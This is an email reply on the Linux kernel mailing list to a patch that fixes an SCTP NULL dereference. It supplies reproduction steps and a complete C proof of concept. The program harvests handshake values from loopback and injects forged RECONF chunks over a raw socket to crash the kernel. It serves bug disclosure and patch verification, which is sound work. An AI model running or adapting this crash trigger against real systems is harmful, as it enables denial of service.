Received: from mail-ed1-f51.google.com (mail-ed1-f51.google.com [209.85.208.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8C04C137750
	for <stable@vger.kernel.org>; Sat, 22 Aug 2026 17:31:52 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.51
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787419914; cv=pass; b=OpnjvHJxt+3zv6Yl/5vWTPKBkpMj5f3r+fpClMYVHtmyuoVjH4aR3ouHGBVZyRvNv14/WreqtL6PfrDQHC70GyMJNAUh686lokGybvcWw69sj9xl10tgQLFO8pIvyuvsFpdnJtRiEaYFBoi8z6DvzetqIjPIpOf9fPnspO4ZMec=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787419914; c=relaxed/simple;
	bh=7MDFWfOnZsF67puZ2k4BHU9e9iMiVVTUpAYuM5YAEDk=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=IAfoH2mq+FYhHq56xDUHuzyvW5tdfHz1lb4QS9myEnM2JzzGoUlCXFra93QqeZoj8P0mDOHBdjmKGYMT02vciYwkusFPcpUmTdikyaHnJkQT2OZ7C8fZe+5PfZNi282kfZPt+ovfczzQ/UUE6DhakWg3p1mAXAnQ1kJaKrGXgbQ=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HgfbEnam; arc=pass smtp.client-ip=209.85.208.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HgfbEnam"
Received: by mail-ed1-f51.google.com with SMTP id 4fb4d7f45d1cf-6a0a4a28cbdso3791662a12.3
        for <stable@vger.kernel.org>; Sat, 22 Aug 2026 10:31:52 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1787419911; cv=none;
        d=google.com; s=arc-20260327;
        b=gy7G/a1eIgXQNqvScphf3OK1kKF6vlK2Sa33HMjf2N/GrFYITZfvyTBMyXBGkElDdw
         27D+8IOUPKmI9BHtVDuKkju1d3AA+VXX0ydIj8tNibdlDI2lC+/QVRGF6fS0PCWUjAEg
         cUx9xkA3lD72f3NOxDIpkdKCFmLJg7OpRVBNMZd3P4N6YF5aiNESjmV6z4TRXZrMVfCE
         Kz0iEVkqMyCUksr++MTMIUMwDSzXNioqaqCzs1Ix+l8lymL1mQ7URHTV+aGFeo6M11Us
         IWzi1F33+D79n5zfSgJdpPxeTL4143N4DMN/U7v9tVu87t8GPYr3Pn5rTLDLyC2HzIpH
         EnYw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:dkim-signature;
        bh=6IKaBnZCyDIqhyNX7268n/JZWhcc3H9eBtv5K09KbEE=;
        fh=e9pIddN5CnYQmcqW7u3cznmss7MzuUHk5SPmMu+yPd8=;
        b=EA3lc5MVByfGO6AA5vSlT7v2EwzK9FpJSyc1qbMBbMW7hb/RKgkd5Ao0tV9JFCrwbo
         LDctw47Ci9xeqIpGnRtVoNjHM17UoAC2+Xe4aFGTHMGkji0lXEVgDPy2F+wkgo0L7e37
         KRCKuXpoglSbHVd4UmUw81oaMTmRGuHvyAWFi+SgzJto7AsUHFJOZHlyRUQM8d26THOf
         hVFHPWlwXPqKUaHW37ponI5ukAhAjY8umQDgpg9NLAmgdlD5xR/imw+OpGzz00Fqmax2
         BpDa5rpM01kQsS2Jsq0IBlTiRHsI0Jj2om/JSXyVymr2wCmbVThwCnwFKfQ3bif5k/vx
         4Usw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1787419911; x=1788024711; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=6IKaBnZCyDIqhyNX7268n/JZWhcc3H9eBtv5K09KbEE=;
        b=HgfbEnamF1rVN6BakE6N4aIh1JA+XCQmTsrFltKIdb4SZUY5huSp2DUyWxGKbZz3gO
         2Qj4STm/PvLvxwJMh9JtHhkE58UIAP6ghosIuh1vpKj6E/eocujVLSVMCrpyhGUdvHu3
         ZAeYuhBx6xVMsWA66sUdltKvmpsfCkGUkW+ObqnkYeW1OoFCVXwQVL3LS8sfuuQ1IU5K
         rHgEGo2N/g4yw8s9oLa7FkGZWSymAjWk9LKtKEElAN3EqMsIHO3f3cIwlZP6prpnt7Yr
         aeb7attt5LhssnBIGGJoOZbJZdYPtEU/SvNe7yKWyWBZhN6+HPuTe3z0PoYWcmRLQDcI
         5w/w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787419911; x=1788024711;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=6IKaBnZCyDIqhyNX7268n/JZWhcc3H9eBtv5K09KbEE=;
        b=d7hd5OZkXF96rB9PwnaZmUTod6/350m+QqQRYmYxMv5+uXQHtzBHEgcPskb9sUff1N
         o0Qv/URQcsSPSk1sohIDvV91uE8fwt/tRrKMTKDrrKVJCuNTB1BuRvoIfc2YCFHLPY0d
         gaa/YDebQ2T24me/crI4uUexVeyOmMWDfAfkUkkuaJMkA2rUHpsqhkdgzSw0erc9gmZM
         DGVB/AGHjD58kEZyM9+KD7Kg5pcAdvQVp9sXUl5HsLmWlj+fq4GElaUMg5QbT4U3F/Vw
         VoTl80Ji4jcIy0bRER0qOEWfA0L3c62dBC92tsDTHAUEZWiCMwdRBxL0F6wgbqrOLkfW
         q8Bg==
X-Forwarded-Encrypted: i=1; AHgh+RoBtaQk1uwAGov9GtbPcY4Tqrk7+jF69Sr9zWGOtvAr3KDNWvq7dNhHeU58YIKuSq+a9MFh+qc=@vger.kernel.org
X-Gm-Message-State: AFuF++kJfe21zuFbHnTbWU87LxRYq7ZxtQxVxfLhtUSnWFKJrf9kwYk7
	oBK3yliooRl/GH2TapJPPnzHIK5jWeTUNi0K6GJW61JwM/u4kseO9/Zn1WHu1kW5L/6mhHn/AQU
	UjV8HZr331uAhnlBL/XzZaA1iAfc3CJ0=
X-Gm-Gg: AR+sD12mpQDTsDub5fehS5fodWN6tZyacsYa8S5le2E8E+gsUCm40gUmAA5Z3ADUjtY
	TcfrKRRgFoNcSb+pZirUSUPr6YZb9fFjLNEGJXku9C/l50SMiCAdq6wKKfGM9relIeZnQcXCN/d
	VAEgk8yuxYR515brazhZIEuuvXMpcxRXTepXrE5QK+gINUsj8Z10Rp3Vjb4Lc3Rjgd7q3nabdx3
	Wp/26CHa7RjrFylDeF2RTYm6v1FZWoJjbYSBL89yF8Cir6vM2tFIMIsuwyMlvU5ZiyDTUzbBcCJ
	2n+EzatzJ5ss635mqtb8rQVoD3qKwrCYkcF31eKYKBaIDodZQVd08IRFQU06XRzbvuoclsLUAf4
	=
X-Received: by 2002:a05:6402:5049:b0:6a3:f63a:4997 with SMTP id
 4fb4d7f45d1cf-6a582af9535mr7971615a12.3.1787419910548; Sat, 22 Aug 2026
 10:31:50 -0700 (PDT)
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260822172352.63025-3-bestswngs@gmail.com>
In-Reply-To: <20260822172352.63025-3-bestswngs@gmail.com>
From: Weiming Shi <bestswngs@gmail.com>
Date: Sun, 23 Aug 2026 01:31:12 +0800
X-Gm-Features: AcwNN1UwfaN46iu3pn8qlCUJA7Cs0hG5N3p59x0bMbVmrRjNA9Z9dsAP0MrRTM8
Message-ID: <CANgPUi29bRnTJNZfTcr6uc0pB88px9BDuNWJV5Co+c9k+g9_Ug@mail.gmail.com>
Subject: Re: [PATCH net v2] sctp: fix NULL deref on untransmitted RECONF completion
To: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>, Xin Long <lucien.xin@gmail.com>, 
	"David S . Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, 
	Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>
Cc: linux-sctp@vger.kernel.org, netdev@vger.kernel.org, 
	linux-kernel@vger.kernel.org, Xiang Mei <xmei5@asu.edu>, stable@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"

Reproduction Steps:

1. Requirements
```
CONFIG_IP_SCTP=y
CONFIG_PACKET=y
```

2. PoC
```c
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define IPPROTO_SCTP_           132
#define SOL_SCTP_               132
#define SCTP_RECONFIG_SUPPORTED_ 117
#define SCTP_ENABLE_STREAM_RESET_ 118
#define SCTP_ENABLE_RESET_STREAM_REQ_ 0x01

#define SCTP_CID_INIT           1
#define SCTP_CID_INIT_ACK       2
#define SCTP_CID_RECONF         0x82

#define P_RESET_OUT_REQUEST     0x000d
#define P_RESET_IN_REQUEST      0x000e
#define P_RESET_RESPONSE        0x0010

#define SRV_PORT                29899

struct sctp_assoc_value_ {
        int assoc_id;
        uint32_t assoc_value;
};

static void die(const char *fmt, ...)
{
        va_list ap;

        va_start(ap, fmt);
        vfprintf(stderr, fmt, ap);
        va_end(ap);
        fprintf(stderr, ": %s\n", strerror(errno));
        exit(1);
}

static void say(const char *fmt, ...)
{
        va_list ap;

        va_start(ap, fmt);
        vprintf(fmt, ap);
        va_end(ap);
        printf("\n");
        fflush(stdout);
}

/* CRC32c (Castagnoli), reflected, as used for the SCTP checksum. */
static uint32_t crc32c(const uint8_t *buf, size_t len)
{
        static uint32_t tab[256];
        static int done;
        uint32_t crc = 0xffffffffu;
        size_t i;

        if (!done) {
                for (i = 0; i < 256; i++) {
                        uint32_t c = (uint32_t)i;
                        int k;

                        for (k = 0; k < 8; k++)
                                c = (c & 1) ? (c >> 1) ^ 0x82f63b78u : c >> 1;
                        tab[i] = c;
                }
                done = 1;
        }

        for (i = 0; i < len; i++)
                crc = tab[(crc ^ buf[i]) & 0xff] ^ (crc >> 8);

        return crc ^ 0xffffffffu;
}

static void put16(uint8_t *p, uint16_t v) { uint16_t t = htons(v);
memcpy(p, &t, 2); }
static void put32(uint8_t *p, uint32_t v) { uint32_t t = htonl(v);
memcpy(p, &t, 4); }

/*
 * Drain the AF_PACKET tap and pull out
 *   - the initial TSN from the INIT we sent          (peer's strreset_inseq)
 *   - the initiate tag from the INIT-ACK we received (vtag for our packets)
 */
static int harvest_handshake(int tap, uint16_t cport, uint32_t *init_tsn,
                             uint32_t *peer_vtag)
{
        int got_tsn = 0, got_vtag = 0;
        uint8_t buf[2048];

        for (;;) {
                ssize_t n = recv(tap, buf, sizeof(buf), MSG_DONTWAIT);
                const uint8_t *ip, *sctp, *chunk;
                unsigned int ihl;
                uint16_t sport, dport;

                if (n < 0) {
                        if (errno == EAGAIN || errno == EWOULDBLOCK)
                                break;
                        die("tap recv");
                }
                if (n < (ssize_t)(sizeof(struct iphdr) + 12 + 4))
                        continue;

                ip = buf;
                if ((ip[0] >> 4) != 4 || ip[9] != IPPROTO_SCTP_)
                        continue;
                ihl = (ip[0] & 0x0f) * 4;
                if (n < (ssize_t)(ihl + 12 + 4 + 16))
                        continue;

                sctp = ip + ihl;
                memcpy(&sport, sctp + 0, 2); sport = ntohs(sport);
                memcpy(&dport, sctp + 2, 2); dport = ntohs(dport);
                chunk = sctp + 12;

                /* INIT we emitted: fixed part is
tag/a_rwnd/nout/nin/initial_tsn */
                if (chunk[0] == SCTP_CID_INIT && sport == cport &&
                    dport == SRV_PORT && !got_tsn) {
                        memcpy(init_tsn, chunk + 4 + 12, 4);
                        *init_tsn = ntohl(*init_tsn);
                        got_tsn = 1;
                }

                /* INIT-ACK from the victim: its initiate tag is our vtag */
                if (chunk[0] == SCTP_CID_INIT_ACK && sport == SRV_PORT &&
                    dport == cport && !got_vtag) {
                        memcpy(peer_vtag, chunk + 4, 4);
                        *peer_vtag = ntohl(*peer_vtag);
                        got_vtag = 1;
                }
        }

        return got_tsn && got_vtag;
}

int main(int argc, char **argv)
{
        struct sockaddr_in srv = { 0 }, cli = { 0 };
        uint32_t init_tsn = 0, peer_vtag = 0;
        int lfd, cfd, afd, tap, raw, one = 1;
        struct sctp_assoc_value_ av;
        struct sockaddr_ll ll = { 0 };
        socklen_t slen;
        uint8_t pkt[64];
        int multichunk;
        uint16_t cport;
        size_t paylen;
        uint32_t ck;
        uint8_t *c;

        multichunk = (argc > 1 && !strcmp(argv[1], "multichunk"));

        srv.sin_family = AF_INET;
        srv.sin_port = htons(SRV_PORT);
        srv.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

        /* ---- victim endpoint ------------------------------------------- */
        lfd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP_);
        if (lfd < 0)
                die("socket(SCTP) -- is the sctp module loaded?");
        if (setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
                die("SO_REUSEADDR");

        av.assoc_id = 0;
        av.assoc_value = 1;
        if (setsockopt(lfd, SOL_SCTP_, SCTP_RECONFIG_SUPPORTED_, &av,
sizeof(av)) < 0)
                die("victim SCTP_RECONFIG_SUPPORTED");
        av.assoc_value = SCTP_ENABLE_RESET_STREAM_REQ_;
        if (setsockopt(lfd, SOL_SCTP_, SCTP_ENABLE_STREAM_RESET_, &av,
sizeof(av)) < 0)
                die("victim SCTP_ENABLE_STREAM_RESET");

        if (bind(lfd, (struct sockaddr *)&srv, sizeof(srv)) < 0)
                die("bind");
        if (listen(lfd, 4) < 0)
                die("listen");
        say("[*] victim listening on 127.0.0.1:%d (reconf + stream
reset on)", SRV_PORT);

        /* ---- tap loopback before the handshake -------------------------- */
        tap = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
        if (tap < 0)
                die("AF_PACKET socket");
        ll.sll_family = AF_PACKET;
        ll.sll_protocol = htons(ETH_P_IP);
        ll.sll_ifindex = if_nametoindex("lo");
        if (!ll.sll_ifindex)
                die("if_nametoindex(lo)");
        if (bind(tap, (struct sockaddr *)&ll, sizeof(ll)) < 0)
                die("bind tap");

        /* ---- attacker association --------------------------------------- */
        cfd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP_);
        if (cfd < 0)
                die("client socket");
        av.assoc_id = 0;
        av.assoc_value = 1;
        if (setsockopt(cfd, SOL_SCTP_, SCTP_RECONFIG_SUPPORTED_, &av,
sizeof(av)) < 0)
                die("client SCTP_RECONFIG_SUPPORTED");

        if (connect(cfd, (struct sockaddr *)&srv, sizeof(srv)) < 0)
                die("connect");
        afd = accept(lfd, NULL, NULL);
        if (afd < 0)
                die("accept");

        slen = sizeof(cli);
        if (getsockname(cfd, (struct sockaddr *)&cli, &slen) < 0)
                die("getsockname");
        cport = ntohs(cli.sin_port);
        say("[*] association established, client port %u", cport);

        if (!harvest_handshake(tap, cport, &init_tsn, &peer_vtag)) {
                fprintf(stderr, "could not recover TSN/vtag from the tap\n");
                return 1;
        }
        say("[*] harvested initial_tsn=0x%08x peer_vtag=0x%08x",
init_tsn, peer_vtag);

        /* ---- forge the RECONF chunk -------------------------------------- */
        memset(pkt, 0, sizeof(pkt));
        put16(pkt + 0, cport);          /* source port      */
        put16(pkt + 2, SRV_PORT);       /* destination port */
        put32(pkt + 4, peer_vtag);      /* verification tag */
        /* pkt + 8: checksum, filled in below */

        c = pkt + 12;

        if (multichunk) {
                /* chunk #1: parks the reply, still corked */
                c[0] = SCTP_CID_RECONF;
                c[1] = 0;
                put16(c + 2, 4 + 8);
                put16(c + 4 + 0, P_RESET_IN_REQUEST);
                put16(c + 4 + 2, 8);
                put32(c + 4 + 4, init_tsn);

                c += 12;
                c[0] = SCTP_CID_RECONF;
                c[1] = 0;
                put16(c + 2, 4 + 12);
                put16(c + 4 + 0, P_RESET_RESPONSE);
                put16(c + 4 + 2, 12);
                put32(c + 4 + 4, 0);
                put32(c + 4 + 8, 0);

                paylen = 12 + 12 + 16;
        } else {
                c[0] = SCTP_CID_RECONF;
                c[1] = 0;
                put16(c + 2, 4 + 8 + 16 + 12);

                put16(c + 4 + 0, P_RESET_IN_REQUEST);
                put16(c + 4 + 2, 8);
                put32(c + 4 + 4, init_tsn);

                put16(c + 12 + 0, P_RESET_OUT_REQUEST);
                put16(c + 12 + 2, 16);
                put32(c + 12 + 4, init_tsn + 1);
                put32(c + 12 + 8, 0);
                put32(c + 12 + 12, 0);

                put16(c + 28 + 0, P_RESET_RESPONSE);
                put16(c + 28 + 2, 12);
                put32(c + 28 + 4, 0);
                put32(c + 28 + 8, 0);

                paylen = 12 + 4 + 8 + 16 + 12;
        }

        ck = crc32c(pkt, paylen);
        memcpy(pkt + 8, &ck, 4);                /* little endian on the wire  */

        raw = socket(AF_INET, SOCK_RAW, IPPROTO_SCTP_);
        if (raw < 0)
                die("raw socket (need CAP_NET_RAW)");

        say("[*] injecting %s", multichunk ?
            "two RECONF chunks in one packet: [IN_REQUEST] [RESPONSE]" :
            "one RECONF chunk: [IN_REQUEST, OUT_REQUEST, RESPONSE]");
        if (sendto(raw, pkt, paylen, 0,
                   (struct sockaddr *)&srv, sizeof(srv)) < 0)
                die("sendto");

        sleep(2);
        say("[*] survived -- no crash");
        (void)afd;
        return 0;
}
```
